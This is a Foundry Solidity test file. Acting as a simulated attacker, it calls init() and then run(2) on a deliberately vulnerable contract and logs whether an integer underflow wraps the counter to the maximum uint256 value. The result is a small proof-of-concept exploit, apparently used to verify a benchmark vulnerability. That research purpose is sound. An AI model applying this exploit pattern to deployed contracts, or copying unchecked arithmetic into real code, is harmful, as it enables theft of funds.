// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_multifunc_feasible.sol";

contract IntegerOverflowTest is Test {
    IntegerOverflowMultiTxMultiFuncFeasible public contractUnderTest;
    address attacker = makeAddr("attacker");
    uint256 public constant MAX_UINT = type(uint256).max;

    function setUp() public {
        contractUnderTest = new IntegerOverflowMultiTxMultiFuncFeasible();
    }

    function test_run_underflow() public {
        // Reset count to 0
        contractUnderTest.resetCount();
        
        // Attack preparation
        vm.prank(attacker);
        contractUnderTest.init();

        console.log("--- BEFORE-Trigger count ---");
        uint256 beforeCount = contractUnderTest.count();
        console.log("Count before run:", beforeCount);

        console.log("--- Trigger run(2) ---");
        // Critical vulnerability trigger
        vm.prank(attacker);
        contractUnderTest.run(2);

        console.log("--- AFTER-Trigger count ---");
        uint256 afterCount = contractUnderTest.count();
        console.log("Count after run:", afterCount);

        // Differential verification
        if (afterCount == MAX_UINT) {
            console.log("Vulnerability Exists: Integer underflow occurred (1 - 2 overflowed to MAX_UINT)");
        } else {
            console.log("Vulnerability not Exist: No integer underflow detected");
        }
    }
}